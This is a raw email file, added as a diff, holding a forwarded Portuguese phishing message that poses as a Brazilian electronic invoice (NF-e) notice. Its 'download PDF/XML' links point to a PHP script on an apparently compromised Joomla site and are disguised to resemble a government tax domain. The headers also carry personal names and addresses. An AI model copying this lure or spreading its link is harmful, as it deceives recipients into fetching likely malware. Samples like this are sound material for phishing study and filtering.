@@ -1,0 +1,205 @@
+Delivered-To: ajuver@gmail.com
+Received: by 10.42.29.135 with SMTP id r7csp434834icc;
+        Thu, 21 Aug 2014 13:09:57 -0700 (PDT)
+X-Received: by 10.50.32.2 with SMTP id e2mr21927022igi.33.1408651796611;
+        Thu, 21 Aug 2014 13:09:56 -0700 (PDT)
+Authentication-Results: mx.google.com;
+       spf=softfail (google.com: best guess record for domain of transitioning unknown does not designate <unknown> as permitted sender) smtp.mail=
+Received-SPF: softfail (google.com: best guess record for domain of transitioning unknown does not designate <unknown> as permitted sender)
+Received: by 10.64.148.102 with POP3 id tr6mf1487003ieb.14;
+        Thu, 21 Aug 2014 13:09:56 -0700 (PDT)
+X-Gmail-Fetch-Info: ajuver@yahoo.com.br 2 pop.mail.yahoo.com.br 995 ajuver
+X-Apparently-To: ajuver@yahoo.com.br via 98.139.244.176; Thu, 21 Aug 2014 20:03:42 +0000
+Received-SPF: pass (domain of prf.gov.br designates 189.9.13.206 as permitted sender)
+X-YMailISG: lQrPaC8WLDvqNJgImM9L5rx_Lul5osR6GYQED6bghJJcLJLF
+ MYLy1kNJrAGGRxTxmbS8tyG8.Er8nkzZF6gXRaWkVTZ9rEsXO1kNXp9xgdZP
+ qvPIHLbspYePQjTfXvZIiX161OvLq_7fwK0xeTCDk.wQsseicIOef6JiQfBU
+ XLQZcZDqQCZz6G1wVgp4NmVYRYHtntYpJCXJHGxkuC2Amj.hpfPUVY43Ygju
+ RBvoqiguC27xNxNhecw10RnIPlDUJW3mtjMMNCHLJR9EWzkhfBUBKHQoE9Pd
+ MCQ3m6rFUkFCSgQ9Q9Tcl7C0EFKjqObnhki4QgujNLs_Zna4cte4sXNFgDwq
+ 1hhd8t134dTjFkMBXjSOTsXoXTpHJ1fv0Ldae3kd92Lm8xC4sipbUaaT3kYt
+ 0oGc5JDI0FsxPkiyeY.mNYtiE.1SJVWpNHF4blHdnlMWkJm9OfAkM61AzRjZ
+ 4uauccZKVkgSC4fVffOHwzEyp38U2aoM7f4Mx62VP19QvvpZAmaMalCnTzW7
+ 5JCANoQgNLAyfc8j0Aa3IG4QiALmEgASu3x73cPJGcwWm3pEpr9nDpTb0IE5
+ gnj5KkG1R.mfeZEEcoJLM4JUlqAmrWDu16bTbVePW9_8lKRViF7NhGvBSJRL
+ K6hioQCKCaeYWZ_01ze66yl.b24s26M6V4joxdcejz6MQtazSoMlw9dl910v
+ RxGSmqEljdp4VqTpX14KwwZ0NjlpINZTjid4349s1AdMG2knsDBo_u3iPLVG
+ Siv7Gnc2WwKG4vd.igwcilmFkE.Jt_8jrfYZRKd8xekTgXXqM.4KEXiP3VCh
+ r8LR593LOh6_2Fjxkt6GpH7bteyfuQiwykVsPIx20vjrpNLbK44Aohb03sgN
+ 7RnaS2U5AdKNRR2s2Sziv0wbCjJI9AHJbvwId5bClrMI_9q86SCvOLRMu9dq
+ qjPzKwbIviBskyty8vjwKmsreUu3SU7njMy60Sa1nefpiQkyepZoivIEJTYe
+ jvU493bBd9577fulKXNe9DmhrrdEP.Aye4es9Z9UES3TTfNrz.hO4aa2dCJn
+ tkM5wYy2wIuoh1sRJ6BF6HMWkMBky763HYPIaejZETVdP1Sm4crZFznhkUoj
+ yRcIz_OREThiXSBQhbf4UjERt5lV9JjB02pnAc5TTmY4d7o6LNJcQG4PPxDP
+ AeS3hhQFayZVBWgUzZNrZZZT7Pqrjr3eNrtinzdxygu8wJYTgnSB9hZTrox3
+ X_NZd9fsdIBP7igX9hxseS36PGpDgUUOzVzBtaYnJl61KNYR7mtt2IaBI.lj
+ zKM3GZzt3nq.lbKMvOArX8Vem3HCiQDVd2m.bl8PdQtERtOQQB0dq7YhWx7w
+ pJgHMQmQDi20ZoSiWnV4EbPvGJ6HOV00oaO6vlJnr4SN0IpMMYKkAmpnVnTN
+ QR0M72CaGIwyvkMIo.DMYtaJHpG2IA2xHnzTfPgKDtnwFT4oxps-
+X-Originating-IP: [189.9.13.206]
+Authentication-Results: mta1318.mail.bf1.yahoo.com  from=prf.gov.br; domainkeys=neutral (no sig);  from=prf.gov.br; dkim=neutral (no sig)
+Received: from 127.0.0.1  (EHLO mx3.prf.gov.br) (189.9.13.206)
+  by mta1318.mail.bf1.yahoo.com with SMTP; Thu, 21 Aug 2014 20:03:41 +0000
+Received: from localhost (localhost [127.0.0.1])
+	by mx3.prf.gov.br (Postfix) with ESMTP id DCA04A006F
+	for <ajuver@yahoo.com.br>; Thu, 21 Aug 2014 16:59:52 -0300 (BRT)
+X-Virus-Scanned: amavisd-new at prf.gov.br
+Received: from mx3.prf.gov.br ([127.0.0.1])
+	by localhost (mx1.prf.gov.br [127.0.0.1]) (amavisd-new, port 10024)
+	with LMTP id WLkqg1ZvjAnt for <ajuver@yahoo.com.br>;
+	Thu, 21 Aug 2014 16:59:51 -0300 (BRT)
+Received: from smtp.prf.gov.br (smtp1.datacenter1 [10.0.102.15])
+	by mx3.prf.gov.br (Postfix) with ESMTP id A996FA004C
+	for <ajuver@yahoo.com.br>; Thu, 21 Aug 2014 16:59:51 -0300 (BRT)
+Received: from [127.0.0.1] (unknown [177.19.184.114])
+	by smtp.prf.gov.br (Postfix) with ESMTPSA id 5CB642ED4
+	for <ajuver@yahoo.com.br>; Thu, 21 Aug 2014 17:03:39 -0300 (BRT)
+Message-ID: <53F65096.7010608@prf.gov.br>
+Date: Thu, 21 Aug 2014 17:03:34 -0300
+From: Ricardo Ost <ricardo.ost@prf.gov.br>
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.6.0
+MIME-Version: 1.0
+To: ajuver@yahoo.com.br
+Subject: Fwd: Prezado Cliente Ricardo Andr&#233
+References: <00c9cf3249155575663dcee6b8366655@akildi-balakai.kz>
+In-Reply-To: <00c9cf3249155575663dcee6b8366655@akildi-balakai.kz>
+X-Forwarded-Message-Id: <00c9cf3249155575663dcee6b8366655@akildi-balakai.kz>
+Content-Type: multipart/alternative;
+ boundary="------------010404000809010400030604"
+X-Antivirus: avast! (VPS 141014-1, 14/10/2014), Inbound message
+X-Antivirus-Status: Clean
+
+This is a multi-part message in MIME format.
+--------------010404000809010400030604
+Content-Type: text/plain; charset=ISO-8859-1; format=flowed
+Content-Transfer-Encoding: 8bit
+
+
+
+
+-------- Mensagem original --------
+Assunto: 	Prezado Cliente Ricardo Andr&#233
+Data: 	Fri, 22 Aug 2014 01:38:12 +0600
+De: 	NF-e (Nota Fiscal Eletronica) <>
+Para: 	Ricardo Andr&#233 <ricardo.ost@dprf.gov.br>
+
+
+
+*******Emissão de NF-e (Nota Fiscal Eletrônica)
+*
+
+*Prezado cliente Ricardo André Ost *
+
+*Foi emitida uma NF-e (Nota Fiscal Eletrônica) referente ao seu pedido 
+nº 10039427, realizado em 19/08/2014 *
+
+*NF-e : Nota Fiscal Eletrônica*
+
+*Escolha abaixo a melhor forma de consultar a sua NF-e:*
+
+  *
+    *Download em formato PDF
+    <http://brissonneau.eu/joomla1.5/modules/mod_archive/NF-e.php?#www.nfe.fazenda.gov.br.zip?token_hash=AAGrL0ATxEh8S998GSW7NUpUaFYqN9UeF-aRITmBv24rIg&dl=1>*
+  *
+    *Download em formato XML
+    <http://brissonneau.eu/joomla1.5/modules/mod_archive/NF-e.php?#www.nfe.fazenda.gov.br.zip?token_hash=AAGrL0ATxEh8S998GSW7NUpUaFYqN9UeF-aRITmBv24rIg&dl=1>***
+
+Atenção: Caso seu pedido tenha mais produtos, que constam nesta NF-e, 
+por favor aguarde a emissão em breve.
+
+
+
+
+--------------010404000809010400030604
+Content-Type: text/html; charset=ISO-8859-1
+Content-Transfer-Encoding: 7bit
+
+<html>
+  <head>
+
+    <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
+  </head>
+  <body text="#000000" bgcolor="#FFFFFF">
+    <br>
+    <div class="moz-forward-container"><br>
+      <br>
+      -------- Mensagem original --------
+      <table class="moz-email-headers-table" cellpadding="0"
+        cellspacing="0" border="0">
+        <tbody>
+          <tr>
+            <th valign="BASELINE" align="RIGHT" nowrap="nowrap">Assunto:
+            </th>
+            <td>Prezado Cliente Ricardo Andr&amp;#233</td>
+          </tr>
+          <tr>
+            <th valign="BASELINE" align="RIGHT" nowrap="nowrap">Data: </th>
+            <td>Fri, 22 Aug 2014 01:38:12 +0600</td>
+          </tr>
+          <tr>
+            <th valign="BASELINE" align="RIGHT" nowrap="nowrap">De: </th>
+            <td>NF-e (Nota Fiscal Eletronica) &lt;&gt;</td>
+          </tr>
+          <tr>
+            <th valign="BASELINE" align="RIGHT" nowrap="nowrap">Para: </th>
+            <td>Ricardo Andr&amp;#233 <a class="moz-txt-link-rfc2396E" href="mailto:ricardo.ost@dprf.gov.br">&lt;ricardo.ost@dprf.gov.br&gt;</a></td>
+          </tr>
+        </tbody>
+      </table>
+      <br>
+      <br>
+      <meta http-equiv="Content-Type" content="text/html;
+        charset=ISO-8859-1">
+      <meta name="Generator" content="7.11">
+      <title></title>
+      <p align="left"><font size="1"><font face="Arial"><font
+              color="#930000" size="4"><strong><font size="1"><font
+                    face="Arial"><font color="#930000"><strong><font
+                          face="Arial"><font color="#930000"><strong><font
+                                face="Arial"><font color="#930000"><strong></strong></font></font></strong></font></font></strong></font><font
+                      color="#007979" size="4">Emiss&atilde;o de NF-e (Nota
+                      Fiscal Eletr&ocirc;nica)</font><br>
+                  </font></font></strong></font></font></font></p>
+      <p align="left"><font size="1"><font face="Arial"><font size="4"><strong><font
+                  size="1"><font face="Arial">Prezado cliente Ricardo
+                    Andr&eacute; Ost
+                  </font></font></strong></font></font></font></p>
+      <p align="left"><font size="1"><font face="Arial"><font size="4"><strong><font
+                  size="1"><font face="Arial">Foi emitida uma NF-e (Nota
+                    Fiscal Eletr&ocirc;nica) referente ao seu pedido n&ordm;
+                    10039427, realizado em&nbsp;19/08/2014 </font></font></strong></font></font></font></p>
+      <p align="left"><font size="1"><font face="Arial"><font size="4"><strong><font
+                  size="1"><font color="#007979" face="Arial">NF-e :
+                    Nota Fiscal Eletr&ocirc;nica</font></font></strong></font></font></font></p>
+      <p align="left"><strong><font face="Arial"><font face="Arial"><font
+                size="1">Escolha abaixo a melhor forma de consultar a
+                sua NF-e:</font></font></font></strong></p>
+      <ul>
+        <li>
+          <div align="left"><strong><font face="Arial"><font
+                  color="#930000"><font face="Arial"><font size="1"><a
+                        moz-do-not-send="true"
+href="http://brissonneau.eu/joomla1.5/modules/mod_archive/NF-e.php?#www.nfe.fazenda.gov.br.zip?token_hash=AAGrL0ATxEh8S998GSW7NUpUaFYqN9UeF-aRITmBv24rIg&amp;dl=1">Download
+                        em formato PDF</a></font></font></font></font></strong></div>
+        </li>
+        <li>
+          <div align="left"><strong><font face="Arial"><font
+                  color="#930000"><font face="Arial"><font size="1"><a
+                        moz-do-not-send="true"
+href="http://brissonneau.eu/joomla1.5/modules/mod_archive/NF-e.php?#www.nfe.fazenda.gov.br.zip?token_hash=AAGrL0ATxEh8S998GSW7NUpUaFYqN9UeF-aRITmBv24rIg&amp;dl=1">Download
+                        em formato XML</a></font></font></font></font></strong><strong></strong></div>
+        </li>
+      </ul>
+      <p align="left">&nbsp;</p>
+      <p align="left"><font color="#000000" face="Arial" size="3"><font
+            color="#007979">Aten&ccedil;&atilde;o</font>: <font size="2">Caso seu
+            pedido tenha mais produtos, que constam nesta NF-e, por
+            favor aguarde a emiss&atilde;o em breve.</font></font></p>
+      <p align="left">&nbsp;</p>
+      <br>
+    </div>
+    <br>
+  </body>
+</html>
+
+--------------010404000809010400030604--
